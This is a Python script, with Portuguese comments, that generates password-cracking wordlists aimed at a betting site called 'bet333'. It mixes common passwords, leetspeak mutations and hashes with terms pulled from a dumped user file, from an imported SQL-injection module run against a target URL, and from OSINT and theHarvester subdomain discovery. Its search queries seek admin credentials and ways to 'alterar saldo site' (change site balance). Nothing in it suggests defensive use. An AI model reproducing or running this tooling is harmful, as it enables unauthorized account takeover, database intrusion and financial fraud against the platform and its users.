import re
import os
import json
import hashlib
import requests
import threading
from bs4 import BeautifulSoup
from itertools import product, chain
from urllib.parse import quote_plus
from fake_useragent import UserAgent
from modules.osint_module import OSINTScraper
from utils.wordlist_engine import save_wordlist, generate_common_passwords

# Remover import circular no topo do arquivo
class WordlistGenerator:
    def __init__(self, dump_file='dump_users.txt', tested_file='wordlist_tested.txt'):
        self.base_terms = set([
            'admin', '123456', 'password', 'senha', 'betadmin', 'bet333',
            'user', 'root', 'qwerty', 'abc123', 'letmein'
        ] + generate_common_passwords())
        self.tested_words = self.load_tested(tested_file)
        self.enriched_terms = set()
        self.dump_file = dump_file
        self.ua = UserAgent()
        self.osint = OSINTScraper()
        self.lock = threading.Lock()

    def load_tested(self, filepath):
        if not os.path.exists(filepath):
            return set()
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return set([line.strip() for line in f.readlines()])

    def leetspeak_variants(self, word):
        substitutions = {
            'a': ['4', '@'], 'e': ['3'], 'i': ['1', '!'], 'o': ['0'], 's': ['$', '5']
        }
        variants = set()
        for i in range(1, 2 ** len(word)):
            chars = list(word)
            for j, char in enumerate(word):
                if char.lower() in substitutions and (i >> j) & 1:
                    chars[j] = substitutions[char.lower()][0]
            variants.add(''.join(chars))
        return variants

    def advanced_mutations(self, word):
        # Gera mutações avançadas para aumentar a cobertura
        mutations = set([
            word, word.lower(), word.upper(), word.capitalize(), word[::-1],
            word + "123", "123" + word, word + "!", word + "@", word + "#", word + "$", word + "2024",
            word.replace("a", "@"), word.replace("o", "0"), word.replace("i", "1"), word.replace("e", "3"),
            hashlib.md5(word.encode()).hexdigest(),
            hashlib.sha1(word.encode()).hexdigest(),
            hashlib.sha256(word.encode()).hexdigest()
        ])
        mutations |= self.leetspeak_variants(word)
        return mutations

    def extract_terms_from_dump(self):
        if not os.path.exists(self.dump_file):
            return
        with open(self.dump_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                words = re.findall(r'\w+', line)
                for word in words:
                    self.base_terms.add(word.lower())

    def search_database_terms(self, target_url):
        try:
            from .sql_injector import SQLInjector
            injector = SQLInjector()
            terms = injector.detect_vulnerable_fields(target_url)
            self.enriched_terms.update(terms)
        except Exception as e:
            print(f"Erro ao extrair termos do banco de dados: {e}")

    def search_duckduckgo(self, query):
        url = f"https://html.duckduckgo.com/html/?q={quote_plus(query)}"
        headers = {'User-Agent': self.ua.random}
        try:
            response = requests.get(url, headers=headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            results = soup.find_all('a', {'class': 'result__a'})
            for result in results:
                self.enriched_terms.update(re.findall(r'\w+', result.get_text()))
        except Exception as e:
            print(f"Erro DuckDuckGo: {e}")

    def scrape_public_sites(self):
        sources = [
            # Governamentais, organizacionais, sociais, técnicos, domínios globais e asiáticos
            "https://www.gov.br/", "https://www.tse.jus.br/", "https://www.usa.gov/", "https://www.europa.eu/",
            "https://www.un.org/", "https://www.who.int/", "https://www.unicef.org/", "https://www.amnesty.org/",
            "https://www.facebook.com", "https://www.instagram.com", "https://www.linkedin.com", "https://www.twitter.com",
            "https://www.youtube.com", "https://www.reddit.com", "https://www.pinterest.com", "https://www.tiktok.com",
            "https://www.github.com", "https://www.gitlab.com", "https://www.bitbucket.org", "https://www.stackoverflow.com",
            "https://www.baidu.com", "https://www.qq.com", "https://www.weibo.com", "https://www.sina.com.cn",
            "https://www.naver.com", "https://www.yandex.ru", "https://www.nic.asia", "https://www.nic.jp", "https://www.nic.cn"
        ]
        for url in sources:
            try:
                response = requests.get(url, headers={'User-Agent': self.ua.random}, timeout=10)
                text = BeautifulSoup(response.text, 'html.parser').get_text()
                words = re.findall(r'\w+', text)
                self.enriched_terms.update([w.lower() for w in words if 5 <= len(w) <= 32])
            except Exception as e:
                print(f"Erro scraping site {url}: {e}")

    def scrape_social_media_titles(self, queries):
        search_base = "https://html.duckduckgo.com/html/?q="
        platforms = [
            "site:facebook.com", "site:instagram.com", "site:x.com", "site:youtube.com", "site:threads.net",
            "site:tiktok.com", "site:linkedin.com", "site:github.com", "site:gitlab.com", "site:bitbucket.org",
            "site:stackoverflow.com", "site:reddit.com", "site:pinterest.com", "site:tumblr.com", "site:medium.com",
            "site:.gov", "site:.org", "site:.edu", "site:.net", "site:.bet", "site:.asia", "site:.jp", "site:.cn"
        ]
        for q in queries:
            for p in platforms:
                full_query = quote_plus(f"{q} {p}")
                url = f"{search_base}{full_query}"
                try:
                    resp = requests.get(url, headers={'User-Agent': self.ua.random}, timeout=10)
                    soup = BeautifulSoup(resp.text, 'html.parser')
                    for result in soup.find_all('a', {'class': 'result__a'}):
                        self.enriched_terms.update(re.findall(r'\w+', result.get_text()))
                except Exception as e:
                    print(f"Erro em {p}: {e}")

    def enrich_with_osint(self, term):
        # Busca em redes sociais, sites .gov, .org, .net, .bet, domínios asiáticos, etc.
        findings = self.osint.analyze_target(term)
        for category, items in findings.items():
            self.enriched_terms.update([i.lower() for i in items if 5 <= len(i) <= 32])

    def integrate_theharvester(self, domain):
        # Integração com módulos do theHarvester para enriquecer ainda mais
        try:
            from external.theHarvester.theHarvester.discovery.bingsearch import SearchBing
            from external.theHarvester.theHarvester.discovery.rapiddns import SearchRapidDns
            from external.theHarvester.theHarvester.discovery.subdomainfinderc99 import SearchSubdomainfinderc99
            from external.theHarvester.theHarvester.discovery.bufferoverun import SearchBufferover
            from external.theHarvester.theHarvester.discovery.netlas import SearchNetlas
            import asyncio

            async def run_harvester():
                results = set()
                # Bing
                bing = SearchBing(domain, 100, 0)
                await bing.do_search()
                results.update(await bing.get_hostnames())
                # RapidDNS
                rapiddns = SearchRapidDns(domain)
                await rapiddns.do_search()
                results.update(await rapiddns.get_hostnames())
                # SubdomainFinderC99
                c99 = SearchSubdomainfinderc99(domain)
                await c99.do_search()
                results.update(await c99.get_hostnames())
                # BufferOver
                bufferover = SearchBufferover(domain)
                await bufferover.do_search()
                results.update(await bufferover.get_hostnames())
                # Netlas
                netlas = SearchNetlas(domain, 100)
                await netlas.do_search()
                results.update(await netlas.get_hostnames())
                return results

            loop = asyncio.get_event_loop()
            hosts = loop.run_until_complete(run_harvester())
            self.enriched_terms.update([h.lower() for h in hosts if 5 <= len(h) <= 32])
        except Exception as e:
            print(f"Erro integrando theHarvester: {e}")

    def generate_wordlist(self, output_file='wordlist_final.txt', target_url=None, domain=None):
        self.extract_terms_from_dump()
        if target_url:
            self.search_database_terms(target_url)
        for base in list(self.base_terms):
            self.base_terms.update(self.leetspeak_variants(base))
            self.base_terms.update(self.advanced_mutations(base))
        # Consultas de busca para enriquecer
        search_queries = [
            "bet333 login admin senha user pass", "betting site admin credentials",
            "gambling platform security", "online casino management", "betting system administration",
            "admin painel acesso", "plataforma apostas admin", "painel controle cassino"
        ]
        for query in search_queries:
            self.search_duckduckgo(query)
        self.scrape_public_sites()
        self.scrape_social_media_titles([
            "bet333", "admin login", "alterar saldo site", "betting admin", "casino management", "platform security"
        ])
        # Enriquecimento OSINT
        for term in list(self.base_terms)[:20]:
            self.enrich_with_osint(term)
        # Integração com theHarvester
        if domain:
            self.integrate_theharvester(domain)
        # Finalização e filtragem
        final_words = (self.base_terms | self.enriched_terms) - self.tested_words
        final_words = set([w.lower() for w in final_words if 5 <= len(w) <= 32])
        save_wordlist(sorted(final_words), output_file)
        print(f"[+] Wordlist gerada com {len(final_words)} palavras: {output_file}")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Gerador Avançado de Wordlists")
    parser.add_argument("--output", default="wordlist_final.txt", help="Arquivo de saída da wordlist")
    parser.add_argument("--target_url", help="URL do banco de dados alvo para extração")
    parser.add_argument("--domain", help="Domínio alvo para integração com OSINT/theHarvester")
    args = parser.parse_args()
    gen = WordlistGenerator()
    gen.generate_wordlist(output_file=args.output, target_url=args.target_url, domain=args.domain)